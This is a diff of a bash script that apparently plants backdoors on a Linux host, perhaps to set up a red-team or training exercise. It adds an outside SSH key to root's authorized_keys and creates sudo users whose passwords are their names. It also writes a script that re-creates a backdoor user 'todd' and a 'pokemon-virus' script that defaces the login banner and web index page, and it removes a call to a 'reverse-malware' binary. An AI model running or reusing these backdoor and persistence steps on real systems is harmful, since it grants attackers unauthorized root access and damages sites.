@@ -36,6 +36,8 @@ do
   useradd -M -g sudo -p $(openssl passwd -crypt $user) $user
 done
 
+/bin/mkdir /root/.ssh
+/usr/bin/touch /root/.ssh/authorized_keys
 cat << EOF >> /root/.ssh/authorized_keys 
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyflMJTndThtH8EaymTG2GG0cqLVcuFtytyjFWy7iRmWvQi0Dsx8ZsW6hNrmOAteA5iYNLg47ZwRI1SdDJjlEpvyzEtdqrJZ7GDYCPQimRtUdOGuYfiTRewLo4V0VKyRfWHTSrDaVaooVwetcI9dQzolz6P2libVQkY/pde4F+YRGWyuU3KxYGTVyWvJ5rZHNDDMJc7AO+K/d/VOGQQmVzBpBraHDAVoeO/aat+JqUDzOk8P/Z1jum9Spa6QlNS21P6fnQUOyLGjdHRt5yHmpdVLHJ5gV3hqiuVc5Qa28avvX4gLTVaa3DfeoERzKFd9b0aCdUmLQXRxekxLHEc/5F zuba@laptop
 EOF
@@ -77,7 +79,6 @@ chmod 755 /bin/trojan.sh
 cat << EOF > /sbin/let_todd_in_VIRUS.sh
 #!/bin/bash
 /usr/sbin/useradd -M -g sudo -p $(openssl passwd -crypt t) todd 2>/dev/null
-/bin/sleep 60
 EOF
 chmod 755 /sbin/let_todd_in_VIRUS.sh
 
@@ -87,7 +88,6 @@ cat << EOF > /bin/fix
 /bin/echo "pokemon" >> /etc/issue.net
 /usr/bin/chattr -i /var/www/html/index.html
 /bin/echo "pokemon" >> /var/www/html/index.html
-/bin/reverse-malware
 EOF
 chmod 755 /bin/fix
 /bin/cp /bin/fix /usr/bin/pokemon-virus
